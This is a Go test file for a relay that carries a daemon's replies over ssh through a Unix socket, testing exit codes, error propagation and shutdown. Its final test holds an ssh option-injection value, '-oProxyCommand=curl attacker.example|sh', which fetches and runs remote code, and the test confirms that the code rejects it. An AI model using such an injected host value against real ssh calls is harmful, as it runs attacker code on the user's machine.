package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/sayaya1090/magi/internal/adapter/daemon"
)

// A daemon answers about itself, and a relay carries that answer without understanding it.
//
// The two together are the whole crossing. What used to happen instead was a process on the far
// side reading a config directory to work out what the daemon it then dialled already knew — which
// is why the answer depended on which account the connection landed as, and why a container, with
// its own filesystem, had nothing to read at all.
func TestARelayCarriesTheDaemonsOwnAnswerAboutItself(t *testing.T) {
	dir := shortSockDir(t)
	sock := filepath.Join(dir, "d.sock")
	ctx, cancel := context.WithCancel(context.Background())
	// Cancelled AND waited for: the goroutine writes into a store rooted in a t.TempDir()
	// created earlier, so a cancel that only asks it to stop leaves a write racing the removal.
	// CI reports that as "TempDir RemoveAll cleanup: directory not empty".
	var running sync.WaitGroup
	running.Add(1)
	t.Cleanup(func() { cancel(); running.Wait() })
	go func() { defer running.Done(); _ = daemon.Serve(ctx, describingEngine{}, sock) }()
	waitForSocket(t, sock)

	// Both halves of a pipe, as ssh would give them.
	inR, inW := io.Pipe()
	outR, outW := io.Pipe()
	go func() { relayHere(inR, outW, io.Discard, sock); outW.Close() }()

	got, err := daemon.Over(twoWay{r: outR, w: inW}).About()
	if err != nil {
		t.Fatalf("asking through the relay: %v", err)
	}
	if got != "design — screens" {
		t.Fatalf("the companion's own words did not come back: %q", got)
	}
}

// A socket that will not open is reported, not hung on.
//
// This is the case where the daemon belongs to another account: the system refuses at connect, and
// its words are more useful than anything magi would say instead.
func TestARelayToASocketItCannotOpenSaysSo(t *testing.T) {
	var errOut bytes.Buffer
	code := relayHere(bytes.NewReader(nil), io.Discard, &errOut,
		filepath.Join(shortSockDir(t), "nothing.sock"))
	if code == 0 {
		t.Fatal("relaying to a socket that is not there reported success")
	}
	if errOut.Len() == 0 {
		t.Fatal("it failed without saying why")
	}
}

// The relay does not read, parse or alter the protocol — it copies bytes.
func TestTheRelayDoesNotUnderstandWhatItCarries(t *testing.T) {
	dir := shortSockDir(t)
	sock := filepath.Join(dir, "e.sock")
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	go func() {
		c, aerr := ln.Accept()
		if aerr != nil {
			return
		}
		defer c.Close()
		b := make([]byte, 64)
		n, _ := c.Read(b)
		// Echoes the raw bytes back, which is not the protocol at all.
		c.Write(b[:n])
	}()

	inR, inW := io.Pipe()
	outR, outW := io.Pipe()
	go func() { relayHere(inR, outW, io.Discard, sock); outW.Close() }()
	go func() { inW.Write([]byte("not json at all\n")); inW.Close() }()

	buf := make([]byte, 64)
	n, _ := outR.Read(buf)
	if string(buf[:n]) != "not json at all\n" {
		t.Fatalf("the relay altered what it carried: %q", buf[:n])
	}
}

type describingEngine struct{ daemon.Engine }

func (describingEngine) About() string { return "design — screens" }

type twoWay struct {
	r io.Reader
	w io.WriteCloser
}

func (t twoWay) Read(b []byte) (int, error)  { return t.r.Read(b) }
func (t twoWay) Write(b []byte) (int, error) { return t.w.Write(b) }
func (t twoWay) Close() error                { return t.w.Close() }

func waitForSocket(t *testing.T, sock string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if c, err := net.Dial("unix", sock); err == nil {
			c.Close()
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("the daemon never came up")
}

var _ = os.Getenv
var _ = json.Marshal

// A machine that answers and has no companion says so, and says it differently from a machine that
// did not answer at all.
//
// This is the only place the difference can be drawn. From the asking side both are missing bytes,
// and they are opposite instructions: one is a wait to end because nothing is coming, the other is
// a link to try again. The far side is the only process that knows which, and an exit code is the
// only channel it has that survives ssh.
func TestAMachineWithNoCompanionAtThatSocketSaysSoDistinctly(t *testing.T) {
	var out, errOut bytes.Buffer
	code := relayHere(strings.NewReader(""), &out, &errOut, filepath.Join(t.TempDir(), "nobody.sock"))
	if code != relayNoDaemon {
		t.Fatalf("a socket with nobody behind it exited %d, which reads as any other failure", code)
	}
	if code == 1 || code == 255 {
		t.Fatal("it collides with 'something else went wrong' or with ssh's own failure")
	}
	if !strings.Contains(errOut.String(), "cannot reach the daemon") {
		t.Errorf("it does not say what was wrong: %q", errOut.String())
	}
	// And the ordinary bad-argument failure keeps the ordinary code, or the two become one answer.
	if code := relayHere(strings.NewReader(""), &out, &errOut, ""); code != 1 {
		t.Errorf("a missing socket argument exited %d, want 1", code)
	}
}

// The end of a crossing carries the reason for it, when the far side gave one.
//
// This is the join between the two halves, and without it they never meet: the far side can exit
// with a code that means "there is no companion here" and the asking side can act on that fact,
// and if the read in between hands back a plain EOF the fact never crosses. A wait that should
// have ended in a second runs for two hours.
func TestTheEndOfACrossingCarriesTheReasonForIt(t *testing.T) {
	gone, err := pipeTo(exec.Command("sh", "-c",
		"echo 'magi: cannot reach the daemon at /x/y.sock: connect: connection refused' 1>&2; exit 7"))
	if err != nil {
		t.Fatal(err)
	}
	defer gone.Close()
	_, rerr := io.ReadAll(gone)
	if !errors.Is(rerr, daemon.ErrGone) {
		t.Fatalf("a far side that said the companion is gone read as %v", rerr)
	}
	if !strings.Contains(rerr.Error(), "cannot reach the daemon") {
		t.Errorf("its words did not come with it: %v", rerr)
	}

	// And an ordinary end stays an ordinary end. A stream that finished normally reporting a dead
	// companion would end every wait the moment it got its answer, which looks like working.
	fine, err := pipeTo(exec.Command("sh", "-c", "echo hello; exit 0"))
	if err != nil {
		t.Fatal(err)
	}
	defer fine.Close()
	said, rerr := io.ReadAll(fine)
	if rerr != nil {
		t.Fatalf("a clean end read as %v", rerr)
	}
	if strings.TrimSpace(string(said)) != "hello" {
		t.Errorf("the stream itself did not come through: %q", said)
	}
}

// The relay ends when the daemon does, even with a caller still holding stdin open.
//
// This is how ssh runs it: the session keeps stdin open for as long as the process lives, so the
// copy carrying requests INTO the daemon never sees an end of its own. Waiting for it after the
// daemon has closed the socket is waiting for something that cannot happen — and both the relay
// and the ssh carrying it stayed up with nothing behind them, while the wait on the other machine
// ran to its two-hour cap. Found by killing a daemon mid-work across two containers.
func TestTheRelayEndsWhenTheDaemonDoesEvenWithStdinStillOpen(t *testing.T) {
	sock := filepath.Join(shortSockDir(t), "d.sock")
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	// A daemon that says one thing and then dies, which is what a killed one looks like.
	go func() {
		c, aerr := ln.Accept()
		if aerr != nil {
			return
		}
		_, _ = io.WriteString(c, "{\"ok\":true}\n")
		c.Close()
		ln.Close()
	}()

	// stdin that never ends, the way ssh holds it.
	held, w := io.Pipe()
	defer w.Close()

	done := make(chan int, 1)
	var out, errOut bytes.Buffer
	go func() { done <- relayHere(held, &out, &errOut, sock) }()
	select {
	case code := <-done:
		if code != 0 {
			t.Fatalf("it ended with %d: %s", code, errOut.String())
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the relay outlived the daemon, holding an ssh open with nothing behind it")
	}
	if !strings.Contains(out.String(), `"ok":true`) {
		t.Errorf("what the daemon said did not come through: %q", out.String())
	}
}

// A host that ssh would read as an OPTION is refused before it reaches argv. A vouched cluster
// member publishing Host="-oProxyCommand=curl evil|sh" would otherwise make ssh run that command on
// THIS machine; doorTo and sshMembers guard the same way git.go guards a ref.
func TestSSHArgvRejectsAnOptionShapedHost(t *testing.T) {
	ctx := context.Background()
	bad := "-oProxyCommand=curl attacker.example|sh"
	if _, err := doorTo(ctx, bad, "/tmp/s.sock"); err == nil {
		t.Error("doorTo built an ssh argv with an option-shaped host")
	}
	for _, s := range []string{"-x", "-oProxyCommand=x", ""} {
		if sshSafeArg(s) {
			t.Errorf("%q should be rejected", s)
		}
	}
	for _, s := range []string{"host.example", "user@host", "192.168.1.2", "/tmp/x.sock"} {
		if !sshSafeArg(s) {
			t.Errorf("%q should be allowed", s)
		}
	}
}
